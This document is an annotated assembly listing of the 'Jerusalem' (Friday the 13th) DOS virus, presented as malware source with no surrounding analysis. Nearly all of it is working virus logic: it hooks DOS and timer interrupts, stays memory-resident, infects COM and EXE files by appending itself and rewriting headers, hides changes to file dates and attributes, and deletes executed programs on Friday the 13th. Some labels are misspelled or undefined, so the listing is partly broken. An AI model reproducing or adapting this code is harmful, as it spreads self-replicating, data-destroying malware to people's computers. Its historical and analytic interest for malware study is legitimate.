;The "Jerusalem" virus.
;Also Called - Israeli, PLO, Friday the 13th - Version A


    PAGE 64,132
;-----------------------------------------------------------------------;
; THE "JERUSALEM" VIRUS                               ;
;-----------------------------------------------------------------------;
                        ;
    ORG  100H           ;
                        ;
;-----------------------------------------------------------------------;
; JERUSALEM VIRUS                                ;
;-----------------------------------------------------------------------;
BEGIN_COM:                   ;COM FILES START HERE
    JMP  CONTINUE       ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
A0103         DB      073H,055H

MS_DOS        DB   'MsDos'        ;

         DB   000H,001H,015H,018H

TIME_BOMB     DB   0         ;WHEN == 1 THIS FILE GETS DELETED!

         DB   000H
A0010         DB   000H

A0011         DW   100H      ;HOST SIZE (BEFORE INFECTION)

OLD_08        DW   0FEA5H,0F000H  ;OLD INT 08H VECTOR (CLOCK TIC)

OLD_21        DW   1460H,024EH    ;OLD INT 21H VECTOR
OLD_24        DW   0556H,16A5H    ;001B

A_FLAG        DW   7E48H          ;???

A0021         DB   000H,000H,000H,000H,000H,000H,000H
         DB   000H,000H,000H,000H

A002C         DW   0         ;A SEGMENT

         DB   000H,000H
A0030         DB   000H

A0031         DW   0178EH         ;OLD ES VALUE

A0033         DW   0080H          ;
                        ;
EXEC_BLOCK    DW   0         ;ENV. SEG. ADDRESS  ;0035
         DW   80H       ;COMMAND LINE ADDRESS
         DW   178EH          ;+4
         DW   005CH          ;FCB #1 ADDRESS
         DW   178EH          ;+8
         DW   006CH          ;FCB #2 ADDRESS
         DW   0178EH         ;+12
                        ;
HOST_SP       DW   0710H          ;(TAKEN FROM EXE HEADER) 0043
HOST_SS       DW   347AH          ;(AT TIME OF INFECTION)
HOST_IP       DW   00C5H          ;
HOST_CS       DW   347AH          ;
;CHECKSUM NOT STORED, TO UNINFECT, YOU MUST CALC IT YOURSELF
                        ;
A004B         DW   0F010H              ;
A004D         DB   82H            ;
A004E         DB   0              ;

EXE_HDR       DB   1CH DUP (?)         ;004F

A006B         DB   5 DUP (?)      ;LAST 5 BYTES OF HOST

HANDLE        DW   0005H               ;0070
HOST_ATT DW   0020H               ;0072
HOST_DATE     DW   0021H               ;0074
HOST_TIME     DW   002DH               ;0076

BLOCK_SIZE    DW   512            ;512 BYTES/BLOCK

A007A         DW   0010H

HOST_SIZE     DW   27C0H,0001H         ;007C
HOST_NAME     DW   41D9H,9B28H         ;POINTER TO HOST NAME

COMMAND_COM   DB   'COMMAND.COM'

         DB   1
A0090         DB   0,0,0,0,0

;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
CONTINUE:                    ;
    CLD                 ;
    MOV  AH,0E0H             ;DO A ???...
    INT  21H            ;
                        ;
    CMP  AH,0E0H             ;
    JNC  L01B5               ;
    CMP  AH,3           ;
    JC   L01B5               ;
                        ;
    MOV  AH,0DDH             ;
    MOV  DI,offset BEGIN_COM ;DI = BEGINNING OF OUR (VIRUS) CODE
    MOV  SI,0710H       ;SI = SIZE OF OUR (VIRUS) CODE
    ADD  SI,DI               ;SI = BEGINNING OF HOST CODE
    MOV  CX,CS:[DI+11H]      ;CX = (SIZE OF HOST CODE?)
    INT  21H            ;
                        ;
L01B5:   MOV  AX,CS               ;TWEEK CODE SEGMENT BY 100H
    ADD  AX,10H              ;
    MOV  SS,AX               ;SS = TWEEKed CS
    MOV  SP,700H             ;SP = END OF OUR CODE (VIRUS)
                        ;
;TWEEK CS TO MAKE IT LOOK LIKE IP STARTS AT 0, NOT 100H BY DOING A RETF
                        ;
    PUSH AX             ;JMP FAR CS+10H:IP-100H
    MOV  AX,offset BEGIN_EXE - offset BEGIN_COM
    PUSH AX             ;
    RETF                ;
                        ;
;---------------------------------------;
    ORG  0C5h           ;
;---------------------------------------;
                        ;
BEGIN_EXE:                   ;EXE FILES START HERE
    CLD                 ;
    PUSH ES             ;
                        ;
    MOV  CS:[A0031],ES       ;
    MOV  CS:[EXEC_BLOCK+4],ES     ;INIT EXEC_BLOCK SEG VALUES
    MOV  CS:[EXEC_BLOCK+8],ES     ;
    MOV  CS:[EXEC_BLOCK+12],ES    ;
                        ;
    MOV  AX,ES               ;TWEEK ES SAME AS CS ABOVE
    ADD  AX,10H              ;
    ADD  CS:[HOST_CS],AX          ;   SAVE NEW ES VALUE
    ADD  CS:[HOST_SS],AX          ;
                        ;
    MOV  AH,0E0H             ;
    INT  21H            ;
                        ;
    CMP  AH,0E0H             ;
    JNC  L0106               ;00F1     7313
                        ;
    CMP  AH,3           ;
    POP  ES             ;00F6
    MOV  SS,CS:[HOST_SS]          ;
    MOV  SP,CS:[HOST_SP]          ;
    JMP  far CS:[HSOT_IP]    ;
                        ;
L0106:   XOR  AX,AX               ;0106     33C0
    MOV  ES,AX               ;0108     8EC0
    MOV  AX,ES:[03FC]        ;010A     26A1FC03
    MOV  CS:[A004B],AX       ;010E     2EA34B00
    MOV  AL,ES:[03FE]        ;0112     26A0FE03
    MOV  CS:[A004D],AL       ;0116     2EA24D00
    MOV  Word ptr ES:[03FC],A5F3  ;011A     26C706FC03F3A5
    MOV  Byte ptr ES:[03FE],CB    ;0121     26C606FE03CB
    POP  AX             ;0127     58
    ADD  AX,10H              ;0128     051000
    MOV  ES,AX               ;012B     8EC0
    PUSH CS             ;012D     0E
    POP  DS             ;012E     1F
    MOV  CX,710H             ;SIZE OF VIRUS CODE
    SHR  CX,1           ;0132     D1E9
    XOR  SI,SI               ;0134     33F6
    MOV  DI,SI               ;0136     8BFE
    PUSH ES             ;0138     06
    MOV  AX,0142             ;0139     B84201
    PUSH AX             ;013C     50
    JMP  0000:03FC      ;013D     EAFC030000
                        ;
    MOV  AX,CS               ;0142     8CC8
    MOV  SS,AX               ;0144     8ED0
    MOV  SP,700H             ;0146     BC0007
    XOR  AX,AX               ;0149     33C0
    MOV  DS,AX               ;014B     8ED8
    MOV  AX,CS:[A004B]       ;014D     2EA14B00
    MOV  [03FC],AX      ;0151     A3FC03
    MOV  AL,CS:[A004D]       ;0154     2EA04D00
    MOV  [03FE],AL      ;0158     A2FE03
    MOV  BX,SP               ;015B     8BDC
    MOV  CL,04               ;015D     B104
    SHR  BX,CL               ;015F     D3EB
    ADD  BX,+10              ;0161     83C310
    MOV  CS:[A0033],BX       ;
                        ;
    MOV  AH,4AH              ;
    MOV  ES,CS:[A0031]       ;
    INT  21H            ;MODIFY ALLOCATED MEMORY BLOCKS
                        ;
    MOV  AX,3521             ;
    INT  21H            ;GET VECTOR
    MOV  CS:[OLD_21],BX      ;
    MOV  CS:[OLD_21+2],ES    ;
                        ;
    PUSH CS             ;0181     0E
    POP  DS             ;0182     1F
    MOV  DX,offset NEW_INT_21     ;0183     BA5B02
    MOV  AX,2521             ;
    INT  21H            ;SAVE VECTOR
                        ;
    MOV  ES,[A0031]          ;018B     8E063100
    MOV  ES,ES:[A002C]       ;018F     268E062C00
    XOR  DI,DI               ;0194     33FF
    MOV  CX,7FFFH       ;0196     B9FF7F
    XOR  AL,AL               ;0199     32C0
    REPNE     SCASB               ;019C     AE
    CMP  ES:[DI],AL          ;019D     263805
    LOOPNZ    019B           ;01A0     E0F9
    MOV  DX,DI               ;01A2     8BD7
    ADD  DX,+03              ;01A4     83C203
    MOV  AX,4B00H       ;LOAD AND EXECUTE A PROGRAM
    PUSH ES             ;
    POP  DS             ;
    PUSH CS             ;
    POP  ES             ;
    MOV  BX,35H              ;
                        ;
    PUSH DS        ;01B1     ;
    PUSH ES             ;
    PUSH AX             ;
    PUSH BX             ;
    PUSH CX             ;
    PUSH DX             ;
                        ;
    MOV  AH,2AH              ;
    INT  21H            ;GET DATE
                        ;
    MOV  Byte ptr CS:[TIME_BOMB],0 ;SET "DONT DIE"
                        ;
    CMP  CX,1987             ;IF 1987...
    JE   L01F7               ;...JUMP
    CMP  AL,5           ;IF NOT FRIDAY...
    JNE  L01D8               ;...JUMP
    CMP  DL,0DH              ;IF DATE IS NOT THE 13th...
    JNE  L01D8               ;...JUMP
    INC  Byte ptr CS:[TIME_BOMB]  ;TIC THE BOMB COUNT
    JMP  L01F7               ;
                        ;
L01D8:   MOV  AX,3508H       ;GET CLOCK TIMER VECTOR
    INT  21H            ;GET VECTOR
    MOV  CS:[OLD_08],BX      ;
    MOV  CS:[OLD_08],ES      ;
                        ;
    PUSH CS             ;DS=CS
    POP  DS             ;
                        ;
    MOV  Word ptr [A_FLAG],7E90H  ;
                        ;
    MOV  AX,2508H       ;SET NEW CLOCK TIC HANDLER
    MOV  DX,offset NEW_08    ;
    INT  21H            ;SET VECTOR
                        ;
L01F7:   POP  DX             ;
    POP  CX             ;
    POP  BX             ;
    POP  AX             ;
    POP  ES             ;
    POP  DS             ;
    PUSHF                    ;
    CALL far CS:[OLD_21]     ;
    PUSH DS             ;
    POP  ES             ;
                        ;
    MOV  AH,49H              ;
    INT  21H            ;FREE ALLOCATED MEMORY
                        ;
    MOV  AH,4DH              ;
    INT  21H            ;GET RETURN CODE OF A SUBPROCESS
                        ;
;---------------------------------------;
; THIS IS WHERE WE REMAIN RESIDENT     ;
;---------------------------------------;
    MOV  AH,31H              ;
    MOV  DX,0600H  ;020F     ;
    MOV  CL,04               ;
    SHR  DX,CL               ;
    ADD  DX,10H              ;
    INT  21H            ;TERMINATE AND REMAIN RESIDENT
                        ;
;---------------------------------------;
NEW_24:  XOR  AL,AL          ;021B     ;CRITICAL ERROR HANDLER
    IRET                ;
                        ;
;-----------------------------------------------------------------------;
; NEW INTERRUPT 08 (CLOCK TIC) HANDLER                     ;
;-----------------------------------------------------------------------;
NEW_08:  CMP  Word ptr CS:[A_FLAG],2   ;021E
    JNE  N08_10              ;IF ... JUMP
                        ;
    PUSH AX             ;
    PUSH BX             ;
    PUSH CX             ;
    PUSH DX             ;
    PUSH BP             ;
    MOV  AX,0602H       ;SCROLL UP TWO LINES
    MOV  BH,87H              ;INVERSE VIDEO ATTRIBUTE
    MOV  CX,0505H       ;UPPER LEFT CORNER
    MOV  DX,1010H       ;LOWER RIGHT CORNER
    INT  10H            ;
    POP  BP             ;
    POP  DX             ;
    POP  CX             ;
    POP  BX             ;
    POP  AX             ;
                        ;
N08_10:  DEC  Word ptr CS:[A_FLAG]     ;
    JMP  N08_90              ;  
    MOV  Word ptr CS:[A_FLAG],1   ;
                        ;
    PUSH AX             ;
    PUSH CX             ;
    PUSH SI             ;  THIS DELAY CODE NEVER GETS EXECUTED  
    MOV  CX,4001H       ;  IN THIS VERSION
    REP  LODSB          ; 
    POP  SI             ;
    POP  CX             ;
    POP  AX             ;
                        ;
N08_90:  JMP  far CS:[OLD_08]          ;PASS CONTROL TO OLD INT 08 VECTOR
                        ;
;-----------------------------------------------------------------------;
; NEW INTERRUPT 21 HANDLER                            ;
;-----------------------------------------------------------------------;
NEW_21:  PUSHF               ;025B     ;
    CMP  AH,0E0H             ;IF A E0 REQUEST...
    JNE  N21_10              ;
    MOV  AX,300H             ;...RETURN AX = 300H
    POPF                ;   (OUR PUSHF)
    IRET                ;
                        ;
N21_10:  CMP  AH,0DDH        ;0266     ;
    JE   N21_30              ;IF DDH...JUMP TO _30
    CMP  AH,0DEH             ;
    JE   N21_40              ;IF DEH...JUMP TO _40
    CMP  AX,4B00H       ;IF SPAWN A PROG...
    JNE  N21_20              ;
    JMP  N21_50              ;...JUMP TO _50
                        ;
N21_20:  POPF                ;   (OUR PUSHF)
    JMP  far CS:[OLD_21]          ;ANY OTHER INT 21 GOES TO OLD VECTOR
                        ;
N21_30:  POP  AX             ;REMOVE OUR (PUSHF)
    POP  AX             ;?
    MOV  AX,100H             ;
    MOV  CS:[000A],AX        ;
    POP  AX             ;
    MOV  CS:[000C],AX        ;
    REP  MOVSB               ;
    POPF                ;   (OUR PUSHF)
    MOV  AX,CS:[000F]        ;
    JMP  far CS:[000A]       ;
                        ;
N21_40:  ADD  SP,+06         ;0298     ;
    POPF                ;   (OUR PUSHF)
    MOV  AX,CS               ;
    MOV  SS,AX               ;
    MOV  SP,710H             ;SIZE OF VIRUS CODE
    PUSH ES             ;
    PUSH ES             ;02A4     06
    XOR  DI,DI               ;02A5     33FF
    PUSH CS             ;02A7     0E
    POP  ES             ;02A8     07
    MOV  CX,0010             ;02A9     B91000
    MOV  SI,BX               ;02AC     8BF3
    MOV  DI,0021             ;02AE     BF2100
    REP  MOVSB               ;02B2     A4
    MOV  AX,DS               ;02B3     8CD8
    MOV  ES,AX               ;02B5     8EC0
    MUL  Word ptr CS:[A007A] ;02B7     2EF7267A00
    ADD  AX,CS:[002B]        ;02BC     2E03062B00
    ADC  DX,+00              ;02C1     83D200
    DIV  Word ptr CS:[A007A] ;02C4     2EF7367A00
    MOV  DS,AX               ;02C9     8ED8
    MOV  SI,DX               ;02CB     8BF2
    MOV  DI,DX               ;02CD     8BFA
    MOV  BP,ES               ;02CF     8CC5
    MOV  BX,CS:[002F]        ;02D1     2E8B1E2F00
    OR   BX,BX               ;02D6     0BDB
    JE   02ED           ;02D8     7413
    MOV  CX,8000             ;02DA     B90080
    REP  MOVSW               ;02DE     A5
    ADD  AX,1000             ;02DF     050010
    ADD  BP,1000             ;02E2     81C50010
    MOV  DS,AX               ;02E6     8ED8
    MOV  ES,BP               ;02E8     8EC5
    DEC  BX             ;02EA     4B
    JNE  02DA           ;02EB     75ED
    MOV  CX,CS:[002D]        ;02ED     2E8B0E2D00
    REP  MOVSB               ;02F3     A4
    POP  AX             ;02F4     58
    PUSH AX             ;02F5     50
    ADD  AX,0010             ;02F6     051000
    ADD  CS:[0029],AX        ;02F9     2E01062900
    ADD  CS:[0025],AX        ;02FE     2E01062500
    MOV  AX,CS:[0021]        ;0303     2EA12100
    POP  DS             ;0307     1F
    POP  ES             ;0308     07
    MOV  SS,CS:[0029]        ;0309     2E8E162900
    MOV  SP,CS:[0027]        ;030E     2E8B262700
    JMP  far CS:[0023]       ;0313     2EFF2E2300
                        ;
;---------------------------------------;
; IT IS TIME FOR THIS FILE TO DIE...   ;
; THIS IS WHERE IT GETS DELETED ! ;
;---------------------------------------;
N21_5A:  XOR  CX,CX               ;
    MOV  AX,4301H       ;
    INT  21H            ;CHANGE FILE MODE (ATT=0)
                        ;
    MOV  AH,41H              ;
    INT  21H            ;DELETE A FILE
                        ;
    MOV  AX,4B00H       ;LOAD AND EXECUTE A PROGRAM
    POPF                ;   (OUR PUSHF)
    JMP  far CS:[OLD_21]          ;
                        ;
;---------------------------------------;
; START INFECTION            ;
;---------------------------------------;
N21_50:  CMP  Byte ptr CS:[TIME_BOMB],1 ;032C ;IF TIME TO DIE...
    JE   N21_5A              ;...JUMP
                        ;
    MOV  Word ptr CS:[HANDLE],-1  ;ASSUME NOT OPEN
    MOV  Word ptr CS:[A008F],0    ;
    MOV  word ptr CS:[HOST_NAME],DX   ;SAVE POINTER TO FILE NAME
    MOV  word ptr CS:[HOST_NAME+2],DS ;
                        ;
;INFECTION PROCESS OCCURS HERE    ;
    PUSH AX             ;034C     50
    PUSH BX             ;034D     53
    PUSH CX             ;034E     51
    PUSH DX             ;034F     52
    PUSH SI             ;0350     56
    PUSH DI             ;0351     57
    PUSH DS             ;0352     1E
    PUSH ES             ;0353     06
    CLD                 ;0354     FC
    MOV  DI,DX               ;0355     8BFA
    XOR  DL,DL               ;0357     32D2
    CMP  Byte ptr [DI+01],3A ;0359     807D013A
    JNE  L0364               ;035D     7505
    MOV  DL,[DI]             ;035F     8A15
    AND  DL,1F               ;0361     80E21F
                        ;
L0364:   MOV  AH,36               ;
    INT  21H            ;GET DISK FREE SPACE
    CMP  AX,-1               ;0368     3DFFFF
    JNE  L0370               ;036B     7503
L036D:   JMP  I_90           ;036D     E97702
                        ;
L0370:   MUL  BX             ;0370     F7E3
    MUL  CX             ;0372     F7E1
    OR   DX,DX               ;0374     0BD2
    JNE  L037D               ;0376     7505
    CMP  AX,710H             ;0378     3D1007
    JC   L036D               ;037B     72F0
L037D:   MOV  DX,word ptr CS:[HOST_NAME]
    PUSH DS             ;0382     1E
    POP  ES             ;0383     07
    XOR  AL,AL               ;0384     32C0
    MOV  CX,41               ;0386     B94100
    REPNE     SCASB               ;038A     AE
    MOV  SI,word ptr CS:[HOST_NAME]
L0390:   MOV  AL,[SI]             ;0390     8A04
    OR   AL,AL               ;0392     0AC0
    JE   L03A4               ;0394     740E
    CMP  AL,61               ;0396     3C61
    JC   L03A1               ;0398     7207
    CMP  AL,7A               ;039A     3C7A
    JA   L03A1               ;039C     7703
    SUB  Byte ptr [SI],20    ;039E     802C20
L03A1:   INC  SI             ;03A1     46
    JMP  L0390               ;03A2     EBEC
                        ;
L03A4:   MOV  CX,000B             ;03A4     B90B00
    SUB  SI,CX               ;03A7     2BF1
    MOV  DI,offset COMMAND_COM    ;03A9     BF8400
    PUSH CS             ;03AC     0E
    POP  ES             ;03AD     07
    MOV  CX,000B             ;03AE     B90B00
    REPE CMPSB               ;03B2     A6
    JNE  L03B8               ;03B3     7503
    JMP  I_90           ;03B5     E92F02
                        ;
L03B8:   MOV  AX,4300H       ;
    INT  21H            ;CHANGE FILE MODE
    JC   L03C4               ;03BD     7205
                        ;
    MOV  CS:[HOST_ATT],CX    ;03BF     ;
L03C4:   JC   L03EB               ;03C4     7225
    XOR  AL,AL               ;03C6     32C0
    MOV  CS:[A004E],AL       ;03C8     2EA24E00
    PUSH DS             ;03CC     1E
    POP  ES             ;03CD     07
    MOV  DI,DX               ;03CE     8BFA
    MOV  CX,41               ;03D0     B94100
    REPNZ     SCASB               ;03D4     AE
    CMP  Byte ptr [DI-02],4D ;03D5     807DFE4D
    JE   L03E6               ;03D9     740B
    CMP  Byte ptr [DI-02],6D ;03DB     807DFE6D
    JE   L03E6               ;03DF     7405
    INC  Byte ptr CS:[A004E] ;03E1     2EFE064E00
                        ;
L03E6:   MOV  AX,3D00H       ;
    INT  21H            ;OPEN FILE READ ONLY
L03EB:   JC   L0447               ;
    MOV  CS:[HANDLE],AX ;03ED     ;
                        ;
    MOV  BX,AX               ;MOVE TO END OF FILE -5
    MOV  AX,4202             ;
    MOV  CX,-1               ;FFFFFFFB
    MOV  DX,-5               ;
    INT  21H            ;MOVE FILE POINTER
    JC   L03EB               ;
                        ;
    ADD  AX,5      ;0400     ;
    MOV  CS:[A0011],AX       ;?SAVE HOST SIZE
                        ;
    MOV  CX,5      ;0407     ;READ LAST 5 BYTES OF HOST
    MOV  DX,offset A006B          ;
    MOV  AX,CS               ;
    MOV  DS,AX               ;
    MOV  ES,AX               ;
    MOV  AH,3FH              ;
    INT  21H            ;READ FROM A FILE
                        ;
    MOV  DI,DX          ;0417     ;CHECK IF LAST 5 BYTES = 'MsDos'
    MOV  SI,offset MS_DOS    ;
    REPE CMPSB               ;
    JNE  L0427               ;
    MOV  AH,3E               ;IF == 'MsDos'...
    INT  21H            ;CLOSE FILE
    JMP  I_90           ;...PASS CONTROL TO DOS
                        ;
L0427:   MOV  AX,3524             ;GET CRITICAL ERROR VECTOR
    INT  21H            ;GET VECTOR
    MOV  [OLD_24],BX         ;
    MOV  [OLD_24+2],ES       ;
                        ;
    MOV  DX,offset NEW_24    ;
    MOV  AX,2524             ;SET CRITICAL ERROR VECTOR
    INT  21H            ;SET VECTOR
                        ;
    LDS  DX,dword ptr [HOST_NAME];
    XOR  CX,CX               ;
    MOV  AX,4301H       ;
    INT  21H            ;CHANGE FILE MODE
L0447:   JC   L0484               ;
                        ;
    MOV  BX,CS:[HANDLE]      ;
    MOV  AH,3E               ;
    INT  21H            ;CLOSE FILE
                        ;
    MOV  Word ptr CS:[HANDLE],-1  ;CLEAR HANDLE
                        ;
    MOV  AX,3D02             ;
    INT  21H            ;OPEN FILE R/W
    JC   L0484               ;
                        ;
    MOV  CS:[HANDLE],AX      ;0460     2EA37000
    MOV  AX,CS               ;0464     8CC8
    MOV  DS,AX               ;0466     8ED8
    MOV  ES,AX               ;0468     8EC0
    MOV  BX,[HANDLE]         ;046A     8B1E7000
    MOV  AX,5700             ;046E     B80057
    INT  21H            ;GET/SET FILE DATE TIME
                        ;
    MOV  [HOST_DATE],DX      ;0473     89167400
    MOV  [HOST_TIME],CX      ;0477     890E7600
    MOV  AX,4200             ;047B     B80042
    XOR  CX,CX               ;047E     33C9
    MOV  DX,CX               ;0480     8BD1
    INT  21H            ;MOVE FILE POINTER
L0484:   JC   L04C3               ;0484     723D
                        ;
    CMP  Byte ptr [A004E],00 ;0486     803E4E0000
    JE   L0490               ;048B     7403
    JMP  L04E6               ;048D     EB57
                        ;
    NOP                 ;048F     90
L0490:   MOV  BX,1000             ;0490     BB0010
    MOV  AH,48               ;0493     B448
    INT  21H            ;ALLOCATE MEMORY
    JNC  L04A4               ;0497     730B
                        ;
    MOV  AH,3E               ;0499     B43E
    MOV  BX,[HANDLE]         ;049B     8B1E7000
    INT  21H            ;CLOSE FILE (OBVIOUSLY)
    JMP  I_90           ;04A1     E94301
                        ;
L04A4:   INC  Word ptr [A008F]    ;04A4     FF068F00
    MOV  ES,AX               ;04A8     8EC0
    XOR  SI,SI               ;04AA     33F6
    MOV  DI,SI               ;04AC     8BFE
    MOV  CX,710H             ;04AE     B91007
    REP  MOVSB               ;04B2     A4
    MOV  DX,DI               ;04B3     8BD7
    MOV  CX,[A0011]          ;?GET HOST SIZE - YES
    MOV  BX,[70H]       ;04B9     8B1E7000
    PUSH ES             ;04BD     06
    POP  DS             ;04BE     1F
    MOV  AH,3FH              ;04BF     B43F
    INT  21H            ;READ FROM A FILE
L04C3:   JC   L04E1               ;04C3     721C
                        ;
    ADD  DI,CX               ;04C5     03F9
                        ;
    XOR  CX,CX               ;POINT TO BEGINNING OF FILE
    MOV  DX,CX               ;
    MOV  AX,4200H       ;
    INT  21H            ;MOVE FILE POINTER
                        ;
    MOV  SI,offset MS_DOS    ;04D0     BE0500
    MOV  CX,5           ;04D3     B90500
    REP  CS:MOVSB       ;04D7     2EA4
    MOV  CX,DI               ;04D9     8BCF
    XOR  DX,DX               ;04DB     33D2
    MOV  AH,40H              ;
    INT  21H            ;WRITE TO A FILE
L04E1:   JC   L04F0               ;
    JMP  L05A2               ;
                        ;
;---------------------------------------;
; READ EXE HEADER            ;
;---------------------------------------;
L04E6:   MOV  CX,1CH              ;READ EXE HEADER INTO BUFFER
    MOV  DX,offset EXE_HDR   ;
    MOV  AH,3F               ;
    INT  21H            ;READ FILE
    JC   L053C               ;
                        ;
;---------------------------------------;
; TWEEK EXE HEADER TO INFECTED HSOT    ;
;---------------------------------------;
    MOV  Word ptr [EXE_HDR+18],1984H ;SAVE HOST'S EXE HEADER INFO
    MOV  AX,[EXE_HDR+14]          ;   SS
    MOV  [HOST_SS],AX        ;
    MOV  AX,[EXE_HDR+16]          ;   SP
    MOV  [HOST_SP],AX        ;
    MOV  AX,[EXE_HDR+20]          ;   IP
    MOV  [HOST_IP],AX        ;
    MOV  AX,[EXE_HDR+22]          ;   CS
    MOV  [HOST_CS],AX        ;
    MOV  AX,[EXE_HDR+4]      ;   SIZE (IN 512 BLOCKS)
    CMP  Word ptr [EXE_HDR+2],0   ;   SIZE MOD 512
    JZ   L051B               ;IF FILE SIZE==0...JMP
    DEC  AX             ;
L051B:   MUL  Word ptr [BLOCK_SIZE]    ;
    ADD  AX,[EXE_HDR+2]      ;
    ADC  DX,0           ;AX NOW = FILE SIZE
                        ;
    ADD  AX,0FH              ;MAKE SURE FILE SIZE IS PARA. BOUND
    ADC  DX,0           ;
    AND  AX,0FFF0H      ;
    MOV  [HOST_SIZE],AX      ;SAVE POINTER TO BEGINNING OF VIRUS
    MOV  [HOST_SIZE+2],DX    ;
                        ;
    ADD  AX,710H             ;(SIZE OF VIRUS)
    ADC  DX,0           ;
L053C:   JC   L0578               ;IF > FFFFFFFF...JMP
    DIV  Word ptr [BLOCK_SIZE]    ;
    OR   DX,DX               ;
    JE   L0547               ;
    INC  AX             ;
L0547:   MOV  [EXE_HDR+4],AX      ;
    MOV  [EXE_HDR+2],DX      ;
                        ;---------------;
    MOV  AX,[HOST_SIZE]                ;DX:AX = HOST SIZE
    MOV  DX,[HOST_SIZE+2]              ;
    DIV  Word ptr [A007A]              ;
    SUB  AX,[EXE_HEAD+8]                    ;SIZE OF EXE HDR
    MOV  [EXE_HDR+22],AX                    ;VALUE OF CS
    MOV  Word ptr [EXE_HDR+20],offset BEGIN_EXE  ;VALUE OF IP
    MOV  [EXE_HDR+14],AX                    ;VALUE OF SS
    MOV  Word ptr [EXE_HDR+16],710H         ;VALUE OF SP
                        ;---------------;
    XOR  CX,CX               ;POINT TO BEGINNING OF FILE (EXE HDR)
    MOV  DX,CX               ;
    MOV  AX,4200H       ;
    INT  21H            ;MOVE FILE POINTER
L0578:   JC   L0584               ;
                        ;
;---------------------------------------;
; WRITE INFECTED EXE HEADER       ;
;---------------------------------------;
    MOV  CX,1CH              ;
    MOV  DX,offset EXE_HDR   ;
    MOV  AH,40H              ;
    INT  21H            ;WRITE TO A FILE
L0584:   JC   L0597               ;
    CMP  AX,CX               ;
    JNE  L05A2               ;
                        ;
    MOV  DX,[HOST_SIZE]      ;POINT TO END OF FILE
    MOV  CX,[HOST_SIZE+2]    ;
    MOV  AX,4200             ;
    INT  21H            ;MOVE FILE POINTER
L0597:   JC   L05A2               ;
                        ;
;---------------------------------------;
; WRITE VIRUS CODE TO END OF HOST ;
;---------------------------------------;
    XOR  DX,DX               ;
    MOV  CX,710H             ;(SIZE OF VIRUS)
    MOV  AH,40H              ;
    INT  21H            ;WRITE TO A FILE
                        ;
L05A2:   CMP  Word ptr CS:[008F],0     ;IF...
    JZ   L05AE               ;...SKIP
    MOV  AH,49H              ;
    INT  21H            ;FREE ALLOCATED MEMORY
                        ;
L05AE:   CMP  Word ptr CS:[HANDLE],-1  ;IF ...
    JE   I_90           ;...SKIP
                        ;
    MOV  BX,CS:[HANDLE]      ;RESTORE HOST'S DATE/TIME
    MOV  DX,CS:[HOST_DATE]   ;
    MOV  CX,CS:[HOST_TIME]   ;
    MOV  AX,5701H       ;
    INT  21H            ;GET/SET FILE DATE/TIME
                        ;
    MOV  AH,3EH              ;
    INT  21H            ;CLOSE FILE
                        ;
    LDS  DX,CS:[HOST_NAME]   ;RESTORE HOST'S ATTRIBUTE
    MOV  CX,CS:[HOST_ATT]    ;
    MOV  AX,4301H       ;
    INT  21H            ;CHANGE FILE MODE
                        ;
    LDS  DX,dword ptr CS:[OLD_24];RESTORE CRITICAL ERROR HANDLER
    MOV  AX,2524H       ;
    INT  21H            ;SET VECTOR
                        ;
I_90:    POP  ES             ;
    POP  DS             ;
    POP  DI             ;
    POP  SI             ;
    POP  DX             ;
    POP  CX             ;
    POP  BX             ;
    POP  AX             ;
    POPF                ;   (OUR PUSHF)
    JMP  far CS:[OLD_21]          ;PASS CONTROL TO DOS
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------

